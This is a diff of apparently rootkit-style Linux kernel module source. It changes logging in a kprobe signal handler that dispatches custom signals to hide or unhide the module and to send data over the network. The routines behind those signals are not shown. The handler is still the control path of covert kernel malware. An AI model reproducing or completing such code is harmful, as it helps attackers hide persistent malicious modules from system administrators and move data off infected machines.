@@ -217,26 +217,25 @@ static int SIGCATCH(struct kprobe *p, struct pt_regs *regs)
     pid_t pid = regs->si;
     int signalno = regs->di;
 
-    pr_info("SIGCATCH: signal %d | PID %d\n", signalno, pid);
     switch (signalno) {
         case SIGALWRECV:
-            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
+            pr_info("SIGCATCH: signal %d\n", signalno);
             ret = kSIGALWRECV();
             break;
         case SIGREMRECV:
-            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
+            pr_info("SIGCATCH: signal %d\n", signalno);
             kSIGREMRECV();
             break;
         case SIGHIDEMOD:
-            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
+            pr_info("SIGCATCH: signal %d\n", signalno);
             kSIGHIDEMOD();
             break;
         case SIGUNHIDEM:
-            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
+            pr_info("SIGCATCH: signal %d\n", signalno);
             kSIGUNHIDEM();
             break;
         case SIGSENDNET:
-            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
+            pr_info("SIGCATCH: signal %d\n", signalno);
             kSIGSENDNET();
             break;
         default:
